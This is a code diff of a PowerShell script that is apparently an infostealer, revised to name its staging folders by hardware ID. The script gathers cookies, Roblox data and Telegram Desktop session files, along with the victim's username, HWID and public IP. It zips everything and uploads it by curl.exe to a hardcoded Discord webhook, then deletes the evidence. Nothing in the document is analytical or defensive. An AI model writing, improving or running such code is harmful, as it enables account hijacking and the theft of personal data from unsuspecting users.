@@ -1,5 +1,6 @@
 $webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"
-$d = "$env:TEMP\Zeta_Cookies"
+try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid = "UNKNOWN_HWID" }
+$d = "$env:TEMP\$hwid"
 if (Test-Path $d) { Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -Path $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
 $found = @()
@@ -44,26 +45,20 @@ if (Test-Path $rob) {
         }
     } catch {}
 }
-$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
-if (Test-Path $tgPath) {
-    $tgDest = "$d\Telegram_tdata"
-    New-Item -Path $tgDest -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    Copy-Item -Path "$tgPath\*" -Destination $tgDest -Recurse -Force -ErrorAction SilentlyContinue
-}
 $u = $env:USERNAME
-try { $h = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $h = "UNKNOWN_HWID" }
 try { $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction Stop).Content } catch { $i = "IP_NOT_FOUND" }
-"User: $u`nHWID: $h`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue
-$zip = "$env:TEMP\cookies.zip"
+"User: $u`nHWID: $hwid`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue
+
+$zip = "$env:TEMP\$hwid.zip"
 if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 try {
     [System.IO.Compression.ZipFile]::CreateFromDirectory($d, $zip)
 } catch {
     if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
-        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -sdel -bso0 -bsp0
+        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -bso0 -bsp0
     } elseif (Test-Path "${env:ProgramFiles(x86)}\7-Zip\7z.exe") {
-        & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -sdel -bso0 -bsp0
+        & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -bso0 -bsp0
     }
 }
 if (Test-Path $zip) {
@@ -71,3 +66,27 @@ if (Test-Path $zip) {
 }
 Remove-Item $zip -Force -ErrorAction SilentlyContinue
 Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
+
+$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
+if (Test-Path $tgPath) {
+    $tgDir = "$env:TEMP\Telegram_$hwid"
+    if (Test-Path $tgDir) { Remove-Item $tgDir -Recurse -Force -ErrorAction SilentlyContinue }
+    New-Item -Path $tgDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+    Copy-Item -Path "$tgPath\*" -Destination $tgDir -Recurse -Force -ErrorAction SilentlyContinue
+    $tgZip = "$env:TEMP\Telegram_$hwid.zip"
+    if (Test-Path $tgZip) { Remove-Item $tgZip -Force -ErrorAction SilentlyContinue }
+    try {
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($tgDir, $tgZip)
+    } catch {
+        if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
+            & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $tgZip $tgDir -mmt -mx5 -bso0 -bsp0
+        } elseif (Test-Path "${env:ProgramFiles(x86)}\7-Zip\7z.exe") {
+            & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $tgZip $tgDir -mmt -mx5 -bso0 -bsp0
+        }
+    }
+    if (Test-Path $tgZip) {
+        curl.exe -s -F "file=@$tgZip" $webhook
+    }
+    Remove-Item $tgZip -Force -ErrorAction SilentlyContinue
+    Remove-Item $tgDir -Recurse -Force -ErrorAction SilentlyContinue
+}
